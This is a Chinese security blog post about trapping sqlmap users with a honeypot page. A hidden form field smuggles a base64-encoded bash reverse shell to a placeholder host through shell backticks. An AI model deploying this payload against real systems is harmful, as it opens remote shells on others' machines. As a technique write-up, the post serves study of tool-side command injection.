<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DhxLaKT7ADnKnTym99dw1g)

_**免责声明：**_

_本公众号致力于安全研究和红队攻防技术分享等内容，本文中所有涉及的内容均不针对任何厂商或个人，同时由于传播、利用本公众号所发布的技术或工具造成的任何直接或者间接的后果及损失，均由使用者本人承担。请遵守中华人民共和国相关法律法规，切勿利用本公众号发布的技术或工具从事违法犯罪活动。最后，文中提及的图文若无意间导致了侵权问题，请在公众号后台私信联系作者，进行删除操作。_

**0x01 序**

之前有群友丢了一个案例，提问 sqlmap 是否有反制漏洞，群里有大哥回复有命令执行，由于自己对这个没有了解，但 sqlmap 嘛又是本脚本小子的常用工具，sql 注入没有 sqlmap 怎么测嘛，那么处于对自己的保护赶紧随着大佬的提醒去看了看文章。  

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybH2bUyz1556SmTmfDIlhx4QR16fd9Y2ye5vGav2REIjZ33V5uPYjcuR5biaBXdhDXiaLKBVp2m9dknA/640?wx_fmt=png&from=appmsg)

**0x02 过程**

找了一些之前的文章，发现大概是 21 年的时候有人提到过的反制方案

构造特殊的 get 或者 post 注入点来等待攻击者使用 sqlmap 扫描，例如下图，将 get 请求中的一个参数的值设置为 `ls`l, 倘若直接改成反弹 shell 的代码即可反控对方机器。   ![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybH2bUyz1556SmTmfDIlhx4QmYTUdSnwcr03I5ezzRy0VX28k72tDKwbEOdzUhR40Wdf81nYd4ebGA/640?wx_fmt=png&from=appmsg)

看似是利用了反引号导致执行了系统命令，sqlmap 躺枪啊

介绍下 shell 规则中单引号、双引号、反引号、无引号的区别

单引号：单引号被识别为普通字符串，就是不识别引号里面的特殊字符，属于强引用。

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybH2bUyz1556SmTmfDIlhx4QGjagAYGdPTDqDVR4xvOic8mcnVyZu2C1VF4kq1nJ7A1llmvOpYQtQjQ/640?wx_fmt=png&from=appmsg)

双引号：双引号里面的特殊字符是可以被识别的，是弱引用。    

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybH2bUyz1556SmTmfDIlhx4QPeTf5KwA35trSlx7ZibIZdHVOeUDEich0EuI6E3PwnhIf0oEscc4z3ww/640?wx_fmt=png&from=appmsg)

反引号：在 linux 中，反引号中的内容一般是一行或多行命令，当这些命令被反引号引着，命令执行结果就会以字符串的形式被保留下来。

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybH2bUyz1556SmTmfDIlhx4Q6icUGB6E8oj4hKKF1kBHtkqmLPCThdMDYbBBjX4e85g7E2yEfpyH5Nw/640?wx_fmt=png&from=appmsg)

无引号：如何是连续的符号可以不加引号，但是如果有空格就有歧义，最好使用双引号。    

于是我们可以构造一个页面，把我们需要传递的参数传入，如果攻击者没仔细看数据包就丢进 sqlmap 尝试注入的话就有可能导致被反制

post 方式的利用：

页面代码:

```
<html>
<head>
<meta charset="utf-8">
<title> test demo</title>
</head>
<body>
<input>search the user</input> 
<form action="test.html" method="post" enctype="text/plain">
<input type='hidden' A20&id=131241241&query=shell`echo YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNzc3NyAwPiYx| base64 -d|bash -i`&port=6379"/>
<input type="submit" value='提交'>
</form>
</body>
</html>

```

Burp 抓包查看    

     ![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybH2bUyz1556SmTmfDIlhx4QEwdLibVGQm1sXYbfiajJ20gtp8KYX9hOl6ubJ6XfFICNZvupLIuUqqpQ/640?wx_fmt=png&from=appmsg)

查看效果

   ![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybH2bUyz1556SmTmfDIlhx4QBUCBPziaibLOue4kLtS2MS4SBZAaWiavKJaL0vck1vJJjf00TrofZFnvQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybH2bUyz1556SmTmfDIlhx4QoLrZ8K3neJDXq7Mvickmw8YZibvLwAA5UvwiaH1FSOfuP6cwjdEUomQhQ/640?wx_fmt=png&from=appmsg)

那么防护方案的话就是，擦亮眼睛啊！  

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybH2bUyz1556SmTmfDIlhx4Q7n8AQNWtf7HK7SzoO0PD6WMzZ5mKrUib5icEBATOgYJabnm3tw1upslQ/640?wx_fmt=png&from=appmsg)  

**0x03 加入我们**

后台回复 “加群” 或“小助手”，或扫描下方二维码加入我们的付费圈子，一起进步吧

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybHZicZnvXwW5LnL1bzhuJAoQ7MpUsy3BY3Cibl6curYWucSMSpxJicscm7zwWDWQaaiapo57oc6L5YH2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFMdnMAXpcyiaNPdyoLppiaPO7glCdCXn1WctQuslCotWHfH709HdYlkyYRK3BcTTzIE5UCw1vS1LJQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)